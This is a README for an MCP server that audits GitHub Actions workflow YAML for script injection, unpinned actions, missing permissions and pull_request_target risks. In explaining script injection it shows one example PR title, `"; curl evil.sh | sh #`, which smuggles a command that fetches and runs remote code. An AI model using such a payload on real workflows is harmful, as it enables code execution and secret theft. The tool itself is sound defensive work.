# github-actions-audit-mcp

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Live on MCPize](https://img.shields.io/badge/Live%20on-MCPize-6d28d9)](https://mcpize.com/mcp/github-actions-audit-mcp)

An MCP server that audits GitHub Actions workflow YAML for the real vulnerability classes that have caused actual
incidents — not a linter, a security scanner. Parses genuine YAML structure (a hand-written block parser scoped to
what workflow files actually use), not string/regex matching against the raw file.

## What it catches

**Script injection.** Any `${{ github.event.issue.title }}`-style expression that carries attacker-controlled text
(issue/PR titles, comments, review bodies, branch names) interpolated directly into a `run:` shell step. The
expression is substituted into the generated shell script *before* the shell runs it — a PR titled `"; curl evil.sh
| sh #` becomes literal shell syntax, not a string. This is the single most common real-world GitHub Actions
vulnerability. Flags the exact expression and shows the env-variable fix that actually neutralizes it.

**Unpinned third-party actions.** `uses: some-action@v4` or `@main` can be repointed by whoever controls that
tag/branch, without you changing a single character in your workflow file — this is exactly what happened in the
[tj-actions/changed-files compromise](https://github.com/tj-actions/changed-files) (March 2025), where a maintainer's
PAT was used to retag `v35`–`v46` to point at a credential-harvesting commit. Only a full 40-character commit SHA is
immutable.

**Missing `permissions:` blocks.** No explicit `permissions:` means the `GITHUB_TOKEN` defaults to whatever your
repo/org settings allow — often read-write. If any step is ever compromised, it inherits that full scope.

**`pull_request_target` + head checkout.** This trigger runs with the base repo's secrets and a write-scoped token
(unlike plain `pull_request`), and if the workflow also checks out the PR's own head commit, a fork's PR can run
arbitrary code with your secrets. Real supply-chain incidents follow this exact pattern.

## Tools

### `audit_workflow`
Full audit of a workflow YAML file. Returns a risk level and every finding with its exact location, why it's
dangerous, and a concrete fix.

### `check_expression_injection`
Focused check on a single shell command string, for when you just want to sanity-check one `run:` step without a
full workflow file.

## Use it

**Hosted (recommended):** [MCPize](https://mcpize.com/mcp/github-actions-audit-mcp) — free tier, $7/mo Pro.

**Self-host:**
```bash
npm install
node server.js
```

## Part of a small suite

[regex-safety-audit-mcp](https://github.com/tylerscomic-lab/regex-safety-audit-mcp),
[mcp-trust-audit-mcp](https://github.com/tylerscomic-lab/mcp-trust-audit-mcp),
[secrets-leak-audit-mcp](https://github.com/tylerscomic-lab/secrets-leak-audit-mcp),
[dockerfile-audit-mcp](https://github.com/tylerscomic-lab/dockerfile-audit-mcp).

## License

MIT
